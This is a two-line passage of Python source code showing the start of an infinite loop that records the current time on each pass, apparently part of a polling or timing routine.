     while True:
         now = time.time()
